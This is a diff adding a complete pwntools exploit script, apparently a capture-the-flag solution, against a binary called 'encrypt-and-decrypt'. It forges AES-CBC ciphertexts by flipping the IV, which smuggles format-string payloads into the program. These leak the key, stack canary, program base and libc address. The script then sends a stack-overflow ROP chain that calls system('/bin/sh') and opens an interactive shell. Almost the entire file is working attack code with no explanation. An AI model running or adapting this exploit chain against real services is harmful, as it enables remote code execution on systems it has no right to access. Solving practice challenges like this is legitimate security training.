@@ -1,0 +1,184 @@
+#!/usr/bin/python3
+from pwn import *
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+import binascii
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from os import urandom
+context.terminal = ["foot"]
+if args.REMOTE:
+    sla = lambda delim, data: p.sendlineafter(delim, data, timeout=3)
+    sa = lambda delim, data: p.sendafter(delim, data, timeout=3)
+    s = lambda data: p.send(data)
+    sl = lambda data: p.sendline(data)
+    r = lambda nbytes: p.recv(nbytes, timeout=3)
+    ru = lambda data: p.recvuntil(data, timeout=3)
+    rl = lambda : p.recvline(timeout=3)
+else:
+    sla = lambda delim, data: p.sendlineafter(delim, data)
+    sa = lambda delim, data: p.sendafter(delim, data)
+    s = lambda data: p.send(data)
+    sl = lambda data: p.sendline(data)
+    r = lambda nbytes: p.recv(nbytes)
+    ru = lambda data: p.recvuntil(data)
+    rl = lambda : p.recvline()
+
+
+elf = context.binary = ELF('encrypt-and-decrypt', checksec=False)
+libc = ELF('libc.so.6')
+base = None
+def int_from_bytes(bytes):
+    return int.from_bytes(bytes, byteorder='little')
+def get_exe_base(pid):
+    maps_file = f"/proc/{pid}/maps"
+    exe_base = None
+
+    with open(maps_file, 'r') as f:
+        exe_base = int(f.readline().split('-')[0], 16)
+
+    if exe_base is None:
+        raise Exception("Executable base address not found.")
+    
+    return exe_base
+
+def encrypt_aes_cbc(key_hex, iv_hex, plaintext_hex):
+    # Convert hex strings to bytes
+    key = binascii.unhexlify(key_hex)
+    iv = binascii.unhexlify(iv_hex)
+    plaintext = binascii.unhexlify(plaintext_hex)
+    
+    # Pad the plaintext to be a multiple of 16 bytes (AES block size)
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_plaintext = padder.update(plaintext) + padder.finalize()
+    
+    # Create an AES CBC cipher with the provided key and IV
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    
+    # Encrypt the plaintext
+    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
+    
+    # Convert ciphertext to hex string and return
+    return binascii.hexlify(ciphertext).decode('utf-8')
+
+def GDB(proc):
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript=f'''
+                   b *({base} + 0x2D51)
+                   #b *({base} + 0x2CEA)
+                   b *({base} + 0x2DB2)
+                   #b *({base} + 0x2C5A)
+                    c
+                    #set *(long long*)($rbp - 0x70)=0
+                    #set *(long long*)($rbp - 0x68)=0
+                    #set *(long long*)($rbp - 0x58)=0
+                    #set *(long long*)($rbp - 0x60)=0
+                    #c
+                    #ni
+                    #x/40xg $rbp - 0x40
+                    ''')
+
+
+def encrypt_tue(key, iv,plaintext):
+  
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    padded_text = pad(plaintext, AES.block_size)
+    ciphertext = cipher.encrypt(padded_text)
+    return iv + ciphertext
+
+def decrypt_tue(key, iv,ciphertext):
+ 
+ 
+    encrypted_message = ciphertext
+    
+   
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_padded_message = cipher.decrypt(encrypted_message)
+    plaintext = unpad(decrypted_padded_message, AES.block_size)
+    
+    return plaintext
+def attack_tue(plaintext_option1 , ciphertext_option1, target) :
+    iv , ciphertext = ciphertext_option1[:16] , ciphertext_option1[16:]
+    target_plaintext = pad(target,16)
+    plaintext_option1 = plaintext_option1.ljust(16, b'\x00')
+    past_dec = xor(plaintext_option1,iv)
+    iv_new = xor(past_dec,target_plaintext)
+    return iv_new + ciphertext
+
+def encrypt(data):
+    sla(b'>', b'1')
+    sl(data)
+def decrypt(data):
+    sla(b'>', b'2')
+    sl(data)
+if args.REMOTE:
+    p = remote(sys.argv[1], sys.argv[2])
+else:
+    p = process()
+    base = get_exe_base(p.pid)
+context.log_level = 'debug'
+GDB(p)
+
+plain_old = b'A'*8
+encrypt(plain_old)
+ru(b'iv: ')
+iv = rl()[:-1]
+ru(b'result: ')
+cipher = rl()[:-1]
+key_hex = '00000000000000000000000000000000'
+iv_hex = '00000000000000000000000000000000'
+
+
+#new_iv, new_cipher = attack_tue(plain_old, cipher, iv)
+#new_iv = new_iv.hex()
+#new_cipher = new_cipher.hex()
+#print('new iv: ', new_iv)
+#print('new cipher: ', new_cipher)
+
+#decrypt(iv_hex.encode() + encrypt_aes_cbc(key_hex, iv_hex, plaintext_hex.hex()).encode())
+#decrypt(iv_hex.encode())
+
+decrypt(attack_tue(bytes(plain_old), bytes.fromhex(iv.decode() + cipher.decode()), b'%10$p|%11$p|\x00').hex())
+leak = ru(b'0x')
+leak = ru(b'|')[:-1]
+leak2 = ru(b'|')[:-1]
+leak = int(leak.decode(), 16)
+leak2 = int(leak2.decode(), 16)
+key = p64(leak) + p64(leak2)
+key = key.hex()
+print('key: ', key)
+iv_hex = '00000000000000000000000000000000'
+plaintext_hex = b'%51$p|%47$p|\x00'
+iv = iv.decode()
+print('iv: ', iv)
+decrypt(iv.encode() + encrypt_aes_cbc(key, iv, plaintext_hex.hex()).encode())
+leak = ru(b'|')[:-1]
+leak = int(leak.decode(), 16)
+print('leak: ', hex(leak))
+elf.address = leak - 0x2a71
+print('elf: ', hex(elf.address))
+leak = ru(b'|')[:-1]
+leak = int(leak.decode(), 16)
+canary = leak
+print('canary: ', hex(canary))
+
+RET = 0x000000000000101a + elf.address#: ret
+
+plaintext_hex = B'A'*8 + b'%42$s|'.ljust(8, b'\x00') + p64(elf.got['printf'])
+decrypt(iv.encode() + encrypt_aes_cbc(key, iv, plaintext_hex.hex()).encode())
+ru(b'A'*8)
+leak = ru(b'|')[:-1]
+leak = int_from_bytes(leak)
+print('printf: ', hex(leak))
+libc.address = leak - libc.sym['printf']
+print('libc: ', hex(libc.address))
+
+rop = ROP(libc)
+rop.raw(RET)
+rop.system(next(libc.search(b'/bin/sh\x00')))
+payload = b'\x00'*0x48 + p64(canary) + p64(0) + rop.chain()
+decrypt(payload)
+
+p.interactive()
